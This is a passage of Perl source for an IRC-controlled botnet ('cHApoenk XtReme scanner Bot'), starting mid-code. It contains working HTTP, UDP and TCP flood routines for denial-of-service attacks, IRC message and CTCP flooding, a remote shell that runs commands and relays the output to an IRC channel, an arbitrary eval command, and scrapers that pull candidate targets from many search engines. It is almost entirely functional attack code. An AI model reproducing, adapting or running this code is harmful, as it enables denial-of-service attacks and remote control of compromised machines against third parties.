my $response=$ua->request($reqz);
}}
}}}
exit;
}}

######################
#End of EXTREMEscanNER# 
#                    #
######################
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#     HTTPFlood      # 
#                    #
######################
if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+HttpKill4+) Attacking 4 ".$1." on port 80 for 4 ".$2." seconds .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+HttpKill4+) Attacking done 4 ".$1.".");
}
######################
#  End of HTTPFlood  # 
#                    #
######################
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
######################
#     UDPFlood       # 
#                    #
######################
if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+HttpKill4+) Attacking4 ".$1." with 4 ".$2." Kb Packets for 4 ".$3." seconds.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :(4+HttpKill4+) Results4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in4 ".$dtime." seconds to4 ".$1.".");
}
exit;
}
}
######################
#  End of Udpflood   # 
#                    #
######################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}


sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "No such file or directory");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}

# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%
# % cHApoenk XtReme scanner Bot  %
# %.%.%.%.%.%.%.%.%.%.%.%.%.%.%.%

sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT :$_[0]");
}

#####
# SUBS GOOGLE
#####
sub googlet {
my @dominios = ("ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk");
my @country = ("AE","AR","AT","AU","BE","BR","CA","CH","CL","DE","DK");
my @lang = ("en","es","de","nl","pt-BR","it","de","fo","sv","fr","el");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $i (@dominios){
my @lista = google($i,$key,$lang[$c],$country[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}

sub google(){
my @lst;
my $i=$_[0];
my $key=$_[1];
my $lang= $_[2];
my $country =$_[3];
for($b=0;$b<=5000;$b+=100){
my $Go=("www.google.".$i."/search?hl=".$lang."&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS AllTheWeb
#####

sub allthewebt {
my @lang = ("en","es","de","nl","pt-BR","it","de","fo");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $lang (@lang){
my @lista = alltheweb($key,$lang[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}


sub alltheweb(){
my @lista;
my $key = $_[0];
my $lang= $_[1];
for($b=0;$b<=500;$b+=100){
my $alltheweb=("http://www.alltheweb.com/search?cat=web&_sb_lang=".$lang."&hits=100&q=".key($key)."&o=".$b);
my $Res=query($alltheweb);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub standard()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS Lycos
#####
sub lycos(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ly=("http://search.lycos.com/?query=".key($key)."&page=$av".$b);
my $Res=query($ly);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS Yahoo
#####
sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://br.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooa(){
my @lst;
my $key = $_[0];
for($b=210;$b<=1000;$b+=210){
my $Ya=("http://be.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahoob(){
my @lst;
my $key = $_[0];
for($b=410;$b<=1000;$b+=210){
my $Ya=("http://us.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooc(){
my @lst;
my $key = $_[0];
for($b=610;$b<=1000;$b+=210){
my $Ya=("http://it.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahood(){
my @lst;
my $key = $_[0];
for($b=810;$b<=1000;$b+=210){
my $Ya=("http://de.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS MSN
#####
sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS SEARCH
#####
sub search(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ser=("http://www.search.com/search?q=".key($key)."".$b);
my $Res=query($ser);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS FireBall
#####
sub fireball(){
my $key=$_[0];
my $inizio=1;
my $pagine=200;
my @lst;
my $av=0;
while($inizio <= $pagine){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inizio++;
}
return @lst;
}

#####
# SUBS UOL
#####
sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# Altavista
#####
sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistade(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistaus(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# HotBot
#####
sub hotbot(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $hot=("http://search.hotbot.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b);
my $Res=query($hot);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


#####
# Mamma
#####
sub mamma(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $mam=("http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=".key($key)."".$b);
my $Res=query($mam);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# MozBot
#####
sub mozbot()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=100; $i+=1){
my $mozbot=("http://www.mozbot.fr/search?q=".key($key)."&st=int&page=".$i);
my $Res=query($mozbot);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}


###############################################
#					      #
#	pemula XtReme scanNER		      #
#					      #
###############################################
